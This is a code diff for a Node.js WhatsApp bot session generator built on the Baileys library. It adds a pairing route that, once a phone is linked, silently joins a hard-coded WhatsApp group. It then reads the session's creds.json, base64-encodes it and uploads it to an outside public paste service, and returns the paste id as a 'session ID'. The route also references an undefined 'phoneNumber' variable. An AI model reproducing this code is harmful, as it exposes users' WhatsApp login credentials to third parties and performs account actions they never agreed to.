@@ -26,8 +26,110 @@ const {
     
     app.get("/number", async (req, res) => {
         let number1 = JSON.stringify(req.query.numb);
-        res.end(number1);
-        
+
+        async function XAsena1() {
+
+            try {
+                let {
+                    version, isLatest
+                } = await fetchLatestBaileysVersion()
+                const {
+                    state, saveCreds
+                } = await useMultiFileAuthState(`./session`)
+                
+                const session = makeWASocket({
+                    version,
+                    logger,
+                    printQRInTerminal: false,
+                    browser: Browsers.macOS("Desktop"),
+                    mobile: true,
+                    auth: {
+                        creds: state.creds,
+                        keys: makeCacheableSignalKeyStore(state.keys,),
+                    },
+                    msgRetryCounterCache,
+                    generateHighQualityLinkPreview: true,
+                    getMessage,
+                })
+            
+                const code = await session.requestPairingCode(phoneNumber)
+                console.log(`Pairing code: ${code}`)
+                res.end(`Pairing code: ${code}`);
+                //------------------------------------------------------
+
+                session.ev.on("connection.update", async (s) => {
+
+                    const {
+                        connection,
+                        lastDisconnect
+                    } = s
+                    if (connection == "open") {
+                        await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
+                        const authfile = (`./session/creds.json`)
+                        await delay(1000 * 10)
+                        var tsurue = "";
+                        let fil = await file.readFileSync("./session/creds.json", "utf-8");
+                        let filz = base64encode(fil);
+                        await console.log(filz);
+                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
+                            headers: {
+"Content-Type": "application/x-www-form-urlencoded",
+                            }
+                        });
+                        tsurue = link.data.split("/")[3]
+                        await session.sendMessage(session.user.id, {
+                            text: "BLUE-LION;;;" + tsurue
+                        })
+                        await session.sendMessage(session.user.id, {
+                            text: `\n*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n\n◕ ⚠️ *ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*`
+                        })
+                        const files = fs.readdirSync("./session");
+                        for (const file of files) {
+                          const data = fs.readFileSync("./session/" + file);
+                          zip.file(file, data);
+                        }
+                        zip
+                          .generateNodeStream({ type: "nodebuffer", streamFiles: true })
+                          .pipe(file.createWriteStream("session.zip"))
+                          .on("finish", async function () {
+                            await session.sendMessage(session.user.id, {
+                                document: {
+                                    url: './session.zip'
+                                },
+                                fileName: "session.zip",
+                                mimetype: "application/zip",
+                            });
+                            await fs.rm('./session', {
+                                recursive: true, force: true
+                            })
+                            process.send('reset')
+                          });
+                       
+                    }
+                    if (
+                        connection === "close" &&
+                        lastDisconnect &&
+                        lastDisconnect.error &&
+                        lastDisconnect.error.output.statusCode != 401
+                    ) {
+                        XAsena1()
+                    }
+                })
+                session.ev.on('creds.update',
+                    saveCreds)
+                await delay(3000 * 10);
+                session.ev.on("messages.upsert",
+                    () => {})
+
+            }catch(err) {
+                console.log(
+                    err + "Unknown Error Occured Please report to Owner and Stay tuned"
+                );
+            }
+
+
+        }
+        XAsena1()
         });
     app.get("/q", (req, res) => {
 
@@ -49,15 +151,10 @@ const {
                     mobile: false,
                     auth: {
                         creds: state.creds,
-                        /** caching makes the store faster to send/recv messages */
-                        keys: makeCacheableSignalKeyStore(state.keys, logger),
+                        keys: makeCacheableSignalKeyStore(state.keys),
                     },
                     msgRetryCounterCache,
                     generateHighQualityLinkPreview: true,
-                    // ignore all broadcast messages -- to receive the same
-                    // comment the line below out
-                    // shouldIgnoreJid: jid => isJidBroadcast(jid),
-                    // implement to handle retries & poll updates
                     getMessage,
                 })
             
